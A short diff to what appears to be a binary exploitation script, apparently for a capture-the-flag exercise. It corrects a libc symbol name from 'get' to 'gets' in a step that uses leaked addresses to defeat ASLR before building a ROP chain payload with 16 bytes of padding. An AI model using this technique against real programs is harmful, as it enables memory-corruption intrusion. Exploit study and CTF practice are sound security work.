@@ -26,7 +26,7 @@ payload = sm.prefix(b"A"*16)
 
 # program returns location of main and gets
 binary_location = int(r.recvline(),16) - bin.symbols["main"]
-libc_location = int(r.recvline(),16) - libc.symbols["get"]
+libc_location = int(r.recvline(),16) - libc.symbols["gets"]
 
 # throws an exception if ROP cannot be easily satisfied.
 payload_bytes = payload.resolve(binary=binary_location, libc=libc_location)
